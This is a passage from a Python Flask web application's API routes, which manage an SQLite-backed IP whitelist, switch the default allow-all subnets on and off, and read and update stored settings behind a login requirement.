                      (ip, f'Added from blocked log {log_id}', 1))
            conn.commit()
            whitelist_id = c.lastrowid
            conn.close()

            return jsonify({'status': 'success', 'whitelist_id': whitelist_id})
        except Exception as e:
            app.logger.error(f"Error adding blocked IP to whitelist: {str(e)}")
            return jsonify({'status': 'error', 'message': str(e)}), 500

    @app.route('/api/deactivate_default_subnets', methods=['POST'])
    @login_required
    def deactivate_default_subnets():
        try:
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()

            # Deactivate default allow all ranges
            c.execute("UPDATE ip_whitelist SET enabled=0 WHERE ip_range IN (?, ?) AND description LIKE 'Default allow all%'",
                      ("0.0.0.0/0", "::/0"))

            conn.commit()
            conn.close()

            return jsonify({'status': 'success', 'message': 'Default subnets deactivated'})
        except Exception as e:
            app.logger.error(f"Error deactivating default subnets: {str(e)}")
            return jsonify({'status': 'error', 'message': str(e)}), 500

    @app.route('/api/reactivate_default_subnets', methods=['POST'])
    @login_required
    def reactivate_default_subnets():
        try:
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()

            # Reactivate default allow all ranges
            c.execute("UPDATE ip_whitelist SET enabled=1 WHERE ip_range IN (?, ?) AND description LIKE 'Default allow all%'",
                      ("0.0.0.0/0", "::/0"))

            conn.commit()
            conn.close()

            return jsonify({'status': 'success', 'message': 'Default subnets reactivated'})
        except Exception as e:
            app.logger.error(f"Error reactivating default subnets: {str(e)}")
            return jsonify({'status': 'error', 'message': str(e)}), 500

    @app.route('/api/settings', methods=['GET'])
    @login_required
    def get_settings():
        try:
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()

            c.execute("SELECT key, value FROM settings")
            rows = c.fetchall()
            settings = {row[0]: row[1] for row in rows}

            conn.close()

            return jsonify({'status': 'success', 'settings': settings})
        except Exception as e:
            app.logger.error(f"Error getting settings: {str(e)}")
            return jsonify({'status': 'error', 'message': str(e)}), 500

    @app.route('/api/settings', methods=['POST'])
    @login_required
    def update_settings():
        try:
            data = request.get_json()
            if not data:
                return jsonify({'status': 'error', 'message': 'No data provided'}), 400

            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()

            for key, value in data.items():
                c.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))

            conn.commit()
            conn.close()

            return jsonify({'status': 'success', 'message': 'Settings updated successfully'})
        except Exception as e:
            app.logger.error(f"Error updating settings: {str(e)}")
            return jsonify({'status': 'error', 'message': str(e)}), 500


